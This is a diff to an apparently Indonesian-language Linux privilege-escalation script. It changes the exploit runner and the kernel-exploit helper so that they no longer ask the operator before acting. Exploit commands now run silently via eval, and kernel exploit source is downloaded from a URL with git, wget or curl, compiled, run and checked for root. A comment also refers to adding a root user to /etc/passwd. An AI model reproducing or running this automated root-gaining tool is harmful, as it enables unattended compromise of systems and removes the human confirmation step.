@@ -168,31 +168,21 @@ run_exploit() {
 
     [ "$EXPLOIT_MODE" -eq 0 ] && return
 
-    echo ""
-    echo -e "${BRIGHT_RED}┌──────────────────────────────────────────────────────────────────────┐${NC}"
-    echo -e "${BRIGHT_RED}│  [AUTO-EXPLOIT] ${WHITE}$name${NC}"
-    echo -e "${BRIGHT_RED}└──────────────────────────────────────────────────────────────────────┘${NC}"
-    echo -e "${YELLOW}CMD:${NC} $cmd"
-    echo -ne "${CYAN}Jalankan exploit ini? [y/N/q=stop exploit mode]: ${NC}"
-    read -r -t 30 _answer 2>/dev/null || _answer="n"
+    echo -ne "${BRIGHT_RED}[EXPLOIT]${NC} ${WHITE}$name${NC} ... "
+    log_exploit "[EXECUTED] $name"
+    log_exploit "CMD: $cmd"
 
-    case "$_answer" in
-        y|Y)
-            echo -e "${BRIGHT_GREEN}[*] Menjalankan exploit...${NC}"
-            log_exploit "[EXECUTED] $name"
-            log_exploit "CMD: $cmd"
-            eval "$cmd"
-            echo -e "${BRIGHT_GREEN}[*] Exploit selesai. Jika sudah dapat shell, ketik 'exit' untuk kembali.${NC}"
-            ;;
-        q|Q)
-            echo -e "${YELLOW}[*] Exploit mode dinonaktifkan.${NC}"
-            EXPLOIT_MODE=0
-            ;;
-        *)
-            echo -e "${GRAY}[*] Dilewati.${NC}"
-            ;;
-    esac
-    echo ""
+    _re_out=$(eval "$cmd" 2>&1)
+    _re_exit=$?
+
+    if [ $_re_exit -eq 0 ] || [ "$(id -u 2>/dev/null)" -eq 0 ] 2>/dev/null; then
+        echo -e "${BRIGHT_GREEN}SUCCESS${NC}"
+        echo -e "${BRIGHT_GREEN}[+] id: $(id 2>/dev/null)${NC}"
+        log_exploit "[SUCCESS] $name — $(id 2>/dev/null)"
+    else
+        echo -e "${RED}FAILED${NC}"
+        log_exploit "[FAILED] $name"
+    fi
 }
 
 # Tambah user root baru ke /etc/passwd (groovy quick win)
@@ -238,46 +228,51 @@ kernel_auto_exploit() {
     local cve="$1" url="$2" compile="$3" run="$4"
     [ "$EXPLOIT_MODE" -eq 0 ] && return
 
-    echo ""
-    echo -e "${BRIGHT_RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${BRIGHT_RED}║  [KERNEL AUTO-EXPLOIT] $cve${NC}"
-    echo -e "${BRIGHT_RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
-    echo -e "${YELLOW}Source :${NC} $url"
-    echo -ne "${CYAN}Download, compile & jalankan? [y/N/q=stop kernel exploits]: ${NC}"
-    read -r -t 30 _ka 2>/dev/null || _ka="n"
+    echo -ne "${BRIGHT_RED}[CVE]${NC} ${WHITE}$cve${NC} — download/compile/run ... "
+    log_exploit "[KERNEL AUTO-EXPLOIT] $cve — $url"
 
-    case "$_ka" in
-        y|Y)
-            _kdir=$(mktemp -d /tmp/kexp_XXXXX)
-            echo -e "${YELLOW}[*] Workdir: $_kdir${NC}"
-            cd "$_kdir" || return 1
+    _kdir=$(mktemp -d /tmp/kexp_XXXXX 2>/dev/null) || { echo -e "${RED}FAILED (mktemp)${NC}"; return 1; }
+    _orig_dir=$(pwd)
+    cd "$_kdir" || { echo -e "${RED}FAILED (cd)${NC}"; return 1; }
 
-            # Download
-            if command -v git >/dev/null 2>&1 && echo "$url" | grep -qE "github\.com"; then
-                git clone --depth=1 "$url" exp 2>&1 | tail -2
-                [ -d exp ] && cd exp
-            elif command -v wget >/dev/null 2>&1; then
-                wget -q "$url" -O exp.c
-            elif command -v curl >/dev/null 2>&1; then
-                curl -sSL "$url" -o exp.c
-            else
-                echo -e "${RED}[-] Tidak ada downloader (git/wget/curl)${NC}"; return 1
-            fi
+    # Download
+    _dl_ok=0
+    if command -v git >/dev/null 2>&1 && echo "$url" | grep -qE "github\.com"; then
+        git clone --depth=1 "$url" exp >/dev/null 2>&1 && _dl_ok=1
+        [ -d exp ] && cd exp
+    fi
+    if [ $_dl_ok -eq 0 ]; then
+        if command -v wget >/dev/null 2>&1; then
+            wget -q "$url" -O exp.c >/dev/null 2>&1 && _dl_ok=1
+        elif command -v curl >/dev/null 2>&1; then
+            curl -sSL "$url" -o exp.c >/dev/null 2>&1 && _dl_ok=1
+        fi
+    fi
 
-            echo -e "${YELLOW}[*] Compiling: $compile${NC}"
-            if eval "$compile" 2>&1; then
-                echo -e "${BRIGHT_GREEN}[+] Compile OK!${NC}"
-                log_exploit "[KERNEL EXPLOIT EXECUTED] $cve"
-                eval "$run"
-                [ "$(id -u)" -eq 0 ] && echo -e "${BRIGHT_GREEN}[!!!] ROOT DIPEROLEH via $cve !!!${NC}" && log_exploit "[ROOT GAINED] $cve"
-            else
-                echo -e "${RED}[-] Compile gagal. Manual: cd $_kdir/exp && $compile && $run${NC}"
-            fi
-            ;;
-        q|Q) EXPLOIT_MODE=0 ;;
-        *) echo -e "${GRAY}[*] Dilewati.${NC}" ;;
-    esac
-    echo ""
+    if [ $_dl_ok -eq 0 ]; then
+        echo -e "${RED}FAILED (download)${NC}"
+        log_exploit "[FAILED] $cve — download error"
+        cd "$_orig_dir"; return 1
+    fi
+
+    # Compile
+    if eval "$compile" >/dev/null 2>&1; then
+        # Run
+        eval "$run" >/dev/null 2>&1
+        if [ "$(id -u 2>/dev/null)" -eq 0 ] 2>/dev/null; then
+            echo -e "${BRIGHT_GREEN}SUCCESS${NC}"
+            echo -e "${BRIGHT_GREEN}[+] id: $(id 2>/dev/null)${NC}"
+            log_exploit "[SUCCESS] $cve — $(id 2>/dev/null)"
+        else
+            echo -e "${YELLOW}PARTIAL${NC} (ran, no root)"
+            log_exploit "[PARTIAL] $cve — ran but not root"
+        fi
+    else
+        echo -e "${RED}FAILED (compile)${NC}"
+        log_exploit "[FAILED] $cve — compile error"
+    fi
+
+    cd "$_orig_dir"
 }
 
 # ── Array untuk self-root engine ─────────────────────────────────────────────
